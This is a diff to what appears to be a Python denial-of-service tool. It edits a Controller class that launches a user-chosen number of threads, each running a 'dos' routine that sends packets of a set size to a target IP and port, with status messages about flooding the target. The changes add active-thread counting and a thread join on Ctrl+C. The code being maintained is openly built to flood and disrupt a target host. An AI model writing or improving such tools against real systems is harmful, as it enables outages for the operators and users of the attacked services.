@@ -7,6 +7,7 @@ import os
 import sys
 import time
 import socket
+import threading
 from threading import Thread
 from argparse import ArgumentParser
 # Site Modules
@@ -177,12 +178,15 @@ class Controller(Dos):
                 print(RED + "Error in switch_ip" + RESET)
                 sys.exit(0)
         try:
+            global thread
             for nr in range(int(amount)):
                 thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
                 print(GREEN + "Starting Thread nr [{}] to target [{}]:[{}]".format(thread, target_ip, port) + RESET)
                 thread.start()
                 print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]:[{}] \n\n" \
                       .format(dos_mode, thread, buffer_size, target_ip, port) + RESET)
+            active_threads = threading.active_count()
+            print(GREEN + "Active Threads [{}]".format(int(active_threads) - 1))
             print(GREEN + "Sending packets ...\n\nPRESS CTRL+C TO QUIT" + RESET)
             while True:     # keep alive to still handle exceptions
                 time.sleep(1)
@@ -191,6 +195,7 @@ class Controller(Dos):
             sys.exit(0)
         except KeyboardInterrupt as ex:
             print(RED + "YOU PRESSED CTRL + C :", ex)
+            thread.join()
             sys.exit(0)
 
     def run(self):
